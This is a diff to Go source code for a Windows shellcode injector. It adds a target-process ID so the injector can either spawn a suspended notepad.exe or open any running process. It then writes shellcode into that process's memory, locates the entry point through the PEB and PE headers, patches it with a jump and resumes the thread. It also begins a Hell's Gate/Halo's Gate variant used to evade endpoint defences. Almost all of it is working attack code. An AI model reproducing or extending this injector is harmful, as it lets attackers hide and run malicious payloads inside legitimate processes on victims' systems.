@@ -19,39 +19,57 @@ import (
   "golang.org/x/sys/windows"
 )
 
-func CreateProcess(shellcode []byte) (error) {
+func CreateProcess(shellcode []byte, pid int) (error) {
 
   kernel32 := windows.NewLazySystemDLL("kernel32.dll")
   ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
+  OpenProcess := kernel32.NewProc("OpenProcess")
   VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
   VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
   WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
   NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
 
-  procInfo := &windows.ProcessInformation{}
-  startupInfo := &windows.StartupInfo{
-    Flags: windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+  var pHandle uintptr
+  var pThread uintptr
+
+  if (pid == 0) { // Use default technique (spawn a notepad.exe in suspended state)
+    procInfo := &windows.ProcessInformation{}
+    startupInfo := &windows.StartupInfo{
+      Flags: windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+    }
+
+    errCreateProcess := windows.CreateProcess(
+      syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"),
+      syscall.StringToUTF16Ptr(""),
+      nil,
+      nil,
+      true,
+      windows.CREATE_SUSPENDED,
+      nil,
+      nil,
+      startupInfo,
+      procInfo,
+    )
+    if errCreateProcess != nil {
+      return errCreateProcess
+    }
+
+    pHandle = uintptr(procInfo.Process)
+    pThread = uintptr(procInfo.Thread)
+
+  } else {
+    pHandle, _, _ = OpenProcess.Call(
+      windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ | windows.PROCESS_QUERY_INFORMATION,
+      uintptr(0),
+      uintptr(pid),
+    )
+
+    
   }
 
-  errCreateProcess := windows.CreateProcess(
-    syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"),
-    syscall.StringToUTF16Ptr(""),
-    nil,
-    nil,
-    true,
-    windows.CREATE_SUSPENDED,
-    nil,
-    nil,
-    startupInfo,
-    procInfo,
-  )
-  if errCreateProcess != nil {
-    return errCreateProcess
-  }
-	
   addr, _, _ := VirtualAllocEx.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     0,
     uintptr(len(shellcode)),
     windows.MEM_COMMIT | windows.MEM_RESERVE,
@@ -64,7 +82,7 @@ func CreateProcess(shellcode []byte) (error) {
 
   // Write shellcode into child process memory
   WriteProcessMemory.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     addr,
     (uintptr)(unsafe.Pointer(&shellcode[0])),
     uintptr(len(shellcode)),
@@ -72,7 +90,7 @@ func CreateProcess(shellcode []byte) (error) {
 
   oldProtect := windows.PAGE_READWRITE
   VirtualProtectEx.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     addr,
     uintptr(len(shellcode)),
     windows.PAGE_EXECUTE_READ,
@@ -82,7 +100,7 @@ func CreateProcess(shellcode []byte) (error) {
   var processInformation PROCESS_BASIC_INFORMATION
   var returnLength uintptr
   ntStatus, _, _ := NtQueryInformationProcess.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     0,
     uintptr(unsafe.Pointer(&processInformation)),
     unsafe.Sizeof(processInformation),
@@ -93,7 +111,7 @@ func CreateProcess(shellcode []byte) (error) {
     if ntStatus == 3221225476 {
       return errors.New("Error calling NtQueryInformationProcess: STATUS_INFO_LENGTH_MISMATCH") // 0xc0000004 (3221225476)
     }
-    fmt.Println(fmt.Sprintf("[!] NtQueryInformationProcess returned NTSTATUS: %x(%d)", ntStatus, ntStatus))
+    fmt.Println(fmt.Sprintf("NtQueryInformationProcess returned NTSTATUS: %x(%d)", ntStatus, ntStatus))
     return errors.New("Error calling NtQueryInformationProcess")
   }
 
@@ -104,7 +122,7 @@ func CreateProcess(shellcode []byte) (error) {
   var readBytes int32
 
   ReadProcessMemory.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     processInformation.PebBaseAddress,
     uintptr(unsafe.Pointer(&peb)),
     unsafe.Sizeof(peb),
@@ -138,7 +156,7 @@ func CreateProcess(shellcode []byte) (error) {
   var readBytes2 int32
 
   ReadProcessMemory.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     peb.ImageBaseAddress,
     uintptr(unsafe.Pointer(&dosHeader)),
     unsafe.Sizeof(dosHeader),
@@ -156,7 +174,7 @@ func CreateProcess(shellcode []byte) (error) {
   var readBytes3 int32
 
   ReadProcessMemory.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     peb.ImageBaseAddress+uintptr(dosHeader.LfaNew),
     uintptr(unsafe.Pointer(&Signature)),
     unsafe.Sizeof(Signature),
@@ -173,7 +191,7 @@ func CreateProcess(shellcode []byte) (error) {
   var readBytes4 int32
 
   ReadProcessMemory.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature),
     uintptr(unsafe.Pointer(&peHeader)),
     unsafe.Sizeof(peHeader),
@@ -186,7 +204,7 @@ func CreateProcess(shellcode []byte) (error) {
 
   if peHeader.Machine == 34404 { // 0x8664
     ReadProcessMemory.Call(
-      uintptr(procInfo.Process),
+      uintptr(pHandle),
       peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader),
       uintptr(unsafe.Pointer(&optHeader64)),
       unsafe.Sizeof(optHeader64),
@@ -195,7 +213,7 @@ func CreateProcess(shellcode []byte) (error) {
 
   } else if peHeader.Machine == 332 { // 0x14c
     ReadProcessMemory.Call(
-      uintptr(procInfo.Process),
+      uintptr(pHandle),
       peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader),
       uintptr(unsafe.Pointer(&optHeader32)),
       unsafe.Sizeof(optHeader32),
@@ -238,26 +256,26 @@ func CreateProcess(shellcode []byte) (error) {
   epBuffer = append(epBuffer, byte(0xe0))
 
   WriteProcessMemory.Call(
-    uintptr(procInfo.Process),
+    uintptr(pHandle),
     ep,
     uintptr(unsafe.Pointer(&epBuffer[0])),
     uintptr(len(epBuffer)),
   )
 
   // Resume the child process
-  _, errResumeThread := windows.ResumeThread(procInfo.Thread)
+  _, errResumeThread := windows.ResumeThread(windows.Handle(pThread))
   if errResumeThread != nil {
     return errors.New(fmt.Sprintf("Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
   }
 
   // Close the handle to the child process
-  errCloseProcHandle := windows.CloseHandle(procInfo.Process)
+  errCloseProcHandle := windows.CloseHandle(windows.Handle(pHandle))
   if errCloseProcHandle != nil {
     return errors.New(fmt.Sprintf("Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()))
   }
 
   // Close the hand to the child process thread
-  errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
+  errCloseThreadHandle := windows.CloseHandle(windows.Handle(pThread))
   if errCloseThreadHandle != nil {
     return errors.New(fmt.Sprintf("Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
   }
@@ -271,7 +289,7 @@ This function uses Hell's Gate + Halo's Gate technique
 
 */
 
-func CreateProcessHalos(shellcode []byte) (error) {
+func CreateProcessHalos(shellcode []byte, pid int) (error) {
 
   kernel32 := windows.NewLazySystemDLL("kernel32.dll")
   VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
